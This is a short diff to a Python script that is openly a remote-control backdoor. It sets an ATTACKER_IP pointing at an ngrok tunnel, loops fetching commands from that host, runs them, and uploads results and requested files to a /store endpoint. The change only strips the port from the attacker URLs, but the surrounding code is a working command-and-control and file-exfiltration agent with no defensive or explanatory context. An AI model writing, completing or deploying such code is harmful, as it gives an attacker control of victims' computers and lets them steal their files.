@@ -9,7 +9,7 @@ ATTACKER_IP = '84ef-209-198-138-39.eu.ngrok.io' # change this to the attacker's 
 ATTACKER_PORT = 8080
 
 # Data is a dict
-def send_post(data, url='https://84ef-209-198-138-39.eu.ngrok.io:8080'):
+def send_post(data, url='https://84ef-209-198-138-39.eu.ngrok.io'):
     data = {"rfile": data}
     data = parse.urlencode(data).encode()
     req = request.Request(url, data=data)
@@ -27,7 +27,7 @@ def send_file(command):
         send_post("[-] Not able to find the file")
         return
 
-    store_url = 'https://84ef-209-198-138-39.eu.ngrok.io:8080/store' # Posts to /store
+    store_url = 'https://84ef-209-198-138-39.eu.ngrok.io/store' # Posts to /store
     with open(path, 'rb') as fp:
         send_post(fp.read(), url=store_url)
 
@@ -39,7 +39,7 @@ def run_command(command):
 
 
 while True:
-    command = request.urlopen("https://84ef-209-198-138-39.eu.ngrok.io:8080").read().decode()
+    command = request.urlopen("https://84ef-209-198-138-39.eu.ngrok.io").read().decode()
 
     if 'terminate' in command:
         break
